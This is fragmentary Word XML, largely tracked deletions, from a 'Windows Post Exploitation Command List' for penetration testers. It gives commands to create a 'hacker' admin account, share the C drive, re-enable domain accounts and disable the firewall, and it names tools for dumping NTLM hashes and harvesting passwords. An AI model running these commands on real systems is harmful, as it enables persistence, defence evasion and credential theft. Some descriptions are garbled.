          </w:rPr>
          <w:delText xml:space="preserve">Vista SP1/7/2008/2008R2 (x86 &amp; x64)</w:delText>
        </w:r>
      </w:del>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Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):</w:delText>
        </w:r>
      </w:del>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*Note*</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> Works well after bypassuac + getsystem (requires system privileges)</w:delText>
        </w:r>
      </w:del>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w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:b w:val="1"/>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Note2</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">* For Dism.exe to work on x64 systems, the long commands are necessary</w:delText>
        </w:r>
      </w:del>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To list features which can be enabled/disabled:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000088A">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49"/>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sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features</w:delText>
        </w:r>
      </w:del>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sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
              <w:sz w:val="18"/>
              <w:szCs w:val="18"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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To enable a feature (TFTP client for example):</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000088D">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51"/>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sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP</w:delText>
        </w:r>
      </w:del>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sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
              <w:sz w:val="18"/>
              <w:szCs w:val="18"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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To disable a feature (again TFTP client):</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000890">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1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">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1440"/>
            </w:tabs>
            <w:ind w:left="1440" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000891">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xkz5gclfsvrj" w:id="346"/>
        <w:bookmarkEnd w:id="346"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Invasive or Altering Commands</w:delText>
        </w:r>
      </w:del>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These commands change things on the target and can lead to getting detected</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:b w:val="1"/>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:br w:type="textWrapping"/>
        </w:r>
      </w:del>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table22"/>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6860"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="3420"/>
            <w:gridCol w:w="6860"/>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user hacker hacker /add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Creates a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’</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localgroup administrators /add hacker</w:delText>
              </w:r>
            </w:del>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or</w:delText>
              </w:r>
            </w:del>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localgroup administrators hacker /add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Adds the new user ‘hacker’ to the local administrators group</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share nothing$=C:\ /grant:hacker,FULL /unlimited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Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.</w:delText>
              </w:r>
            </w:del>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One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind</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 user username /active:yes /domain</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Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched.</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netsh firewall set opmode disable</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Disables the local windows firewall</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netsh firewall set opmode enable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u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it.</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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A7">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vec9dd91nzt" w:id="347"/>
        <w:bookmarkEnd w:id="347"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Support Tools Binaries / Links / Usage</w:delText>
        </w:r>
      </w:del>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bl>
      <w:tblPr>
        <w:tblStyle w:val="Table23"/>
        <w:tblW w:w="10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3"/>
        <w:gridCol w:w="4092"/>
        <w:gridCol w:w="3195"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="2993"/>
            <w:gridCol w:w="4092"/>
            <w:gridCol w:w="3195"/>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Link to download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tc>
      </w:tr>
    </w:tbl>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B1">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40" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:smallCaps w:val="0"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-08-23T10:19:49Z">
          <w:pPr>
            <w:pStyle w:val="Heading2"/>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:ind w:left="720" w:firstLine="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_ffa43r4w2v79" w:id="348"/>
        <w:bookmarkEnd w:id="348"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Third Party </w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Portable</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> Tools</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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 (must be </w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">contained</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> in a single executable)</w:delText>
        </w:r>
      </w:del>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color w:val="ff0000"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:b w:val="1"/>
              <w:smallCaps w:val="0"/>
              <w:color w:val="ff0000"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:smallCaps w:val="0"/>
            <w:color w:val="ff0000"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:b w:val="1"/>
                <w:smallCaps w:val="0"/>
                <w:color w:val="ff0000"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">REMEMBER: DO NOT RUN BINARIES YOU HAVEN’T VETTED - BINARIES BELOW ARE NOT BEING VOUCHED FOR IN ANY WAY AS THIS DOCUMENT CAN BE EDITED BY ANYONE</w:delText>
        </w:r>
      </w:del>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color w:val="ff0000"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:b w:val="1"/>
              <w:smallCaps w:val="0"/>
              <w:color w:val="ff0000"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table2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780"/>
        <w:gridCol w:w="3855"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="2445"/>
            <w:gridCol w:w="3780"/>
            <w:gridCol w:w="3855"/>
          </w:tblGrid>
        </w:tblGridChange>
      </w:tblGrid>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Command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Link to download</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b w:val="1"/>
                <w:smallCaps w:val="0"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:b w:val="1"/>
                    <w:smallCaps w:val="0"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:b w:val="1"/>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:b w:val="1"/>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Description</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carrot.exe /im /ie /ff /gc /wlan /vnc /ps /np /mp /dialup /pwdump</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http://h.ackack.net/carrot-exe.html</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color w:val="ff0000"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                      <w:color w:val="ff0000"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">-invasive- </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Recovers a bunch passwordnetsh firewall set opmode disables.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PwDump7.exe &gt; ntlm.txt</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http://www.tarasco.org/security/pwdump_7/</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color w:val="ff0000"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                      <w:color w:val="ff0000"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">-invasive- </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Dumps Windows NTLM hashes. Holds the credentials for all accounts.</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="660" w:hRule="atLeast"/>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line="240" w:lineRule="auto"/>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http://www.nirsoft.net/utils/nircmd.html</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A collection of small nifty features.</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pStyle w:val="Heading2"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:pBdr>
                <w:top w:space="0" w:sz="0" w:val="nil"/>
                <w:left w:space="0" w:sz="0" w:val="nil"/>
                <w:bottom w:space="0" w:sz="0" w:val="nil"/>
                <w:right w:space="0" w:sz="0" w:val="nil"/>
                <w:between w:space="0" w:sz="0" w:val="nil"/>
              </w:pBdr>
              <w:shd w:fill="auto" w:val="clear"/>
              <w:spacing w:after="80" w:before="360" w:line="276" w:lineRule="auto"/>
              <w:ind w:left="720" w:right="0" w:firstLine="0"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
                <w:smallCaps w:val="0"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_g3pxwwmglaom" w:id="349"/>
              <w:bookmarkEnd w:id="349"/>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:del>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adfind.exe -b ou=ActiveDirectory,dc=example,dc=com -f "objectClass=user" sn givenName  samaccountname -nodn -adcsv &gt; exported_users.csv</w:delText>
              </w:r>
            </w:del>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color w:val="1155cc"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                      <w:color w:val="1155cc"/>
                      <w:u w:val="single"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">http://www.joeware.net/freetools/</w:delText>
              </w:r>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Joeware tools have been used by admins for a while. This command will output the firstname, lastname and username of everyone in the AD domain example.com. Edit as needed.</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:trPr>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Various tools</w:delText>
              </w:r>
            </w:del>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(e.g. \\hackarmoury.com\tools\all_binaries\fgdump.exe)</w:delText>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Some examples of protocols in use:</w:delText>
              </w:r>
            </w:del>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http://hackarmoury.com/tools</w:delText>
              </w:r>
            </w:del>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\\hackarmoury.com\tools</w:delText>
              </w:r>
            </w:del>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ftp://hackarmoury.com</w:delText>
              </w:r>
            </w:del>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svn://hackarmoury.com</w:delText>
              </w:r>
            </w:del>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color w:val="000099"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                    <w:color w:val="000099"/>
                    <w:u w:val="single"/>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svn://hackarmoury.com</w:delText>
              </w:r>
            </w:del>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color w:val="000099"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                      <w:color w:val="000099"/>
                      <w:u w:val="single"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">http://ipv6.hackarmoury.com</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> (IPv6 ONLY)</w:delText>
              </w:r>
            </w:del>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line="240" w:lineRule="auto"/>
              <w:ind w:left="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HackArmoury.com is a site run by pentesters for pentesters, hosting a wide range of common tools accessible over many different protocols (e.g. Samba, HTTP[S], FTP, RSync, SVN, TFTP, IPv6 etc). The idea is you can access a common toolset from anywhere, without even needing to copy over the binaries to the host in the case of SMB.</w:delText>
              </w:r>
            </w:del>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smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">No registration or authentication required.</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:smallCaps w:val="0"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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line="240" w:lineRule="auto"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:smallCaps w:val="0"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>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0"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:b w:val="1"/>
              <w:smallCaps w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:sectPr>
      <w:headerReference r:id="rId17" w:type="default"/>
      <w:footerReference r:id="rId18" w:type="default"/>
      <w:pgSz w:h="15840" w:w="12240"/>
      <w:pgMar w:bottom="1080" w:top="108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font w:name="Trebuchet MS"/>
  <w:font w:name="Oswald"/>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mallCaps w:val="0"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
      <w:rPr>
        <w:b w:val="1"/>
        <w:smallCaps w:val="0"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:rtl w:val="0"/>
      </w:rPr>
      <w:t xml:space="preserve">Windows Post Exploitation Command List - </w:t>
    </w:r>
    <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
      <w:rPr>
        <w:b w:val="1"/>
        <w:smallCaps w:val="0"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:rtl w:val="0"/>
      </w:rPr>
      <w:t xml:space="preserve">Page</w:t>
    </w:r>
    <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
      <w:rPr>
        <w:b w:val="1"/>
        <w:smallCaps w:val="0"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:rtl w:val="0"/>
      </w:rPr>
      <w:t xml:space="preserve">: </w:t>
    </w:r>
    <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
      <w:rPr>
        <w:b w:val="1"/>
        <w:smallCaps w:val="0"/>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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="18"/>
        <w:u w:val="none"/>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:vertAlign w:val="baseli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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="18"/>
        <w:u w:val="none"/>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:vertAlign w:val="baseli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b w:val="0"/>
        <w:i w:val="0"/>
        <w:smallCaps w:val="0"/>
        <w:strike w:val="0"/>
        <w:color w:val="000000"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="1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18"/>
        <w:szCs w:val="18"/>
        <w:u w:val="none"/>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:vertAlign w:val="baseli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240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="1"/>
      <w:smallCaps w:val="0"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="48"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:pPr>
      <w:keepNext w:val="0"/>
      <w:keepLines w:val="0"/>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="80" w:before="360" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="1"/>
      <w:smallCaps w:val="0"/>
      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
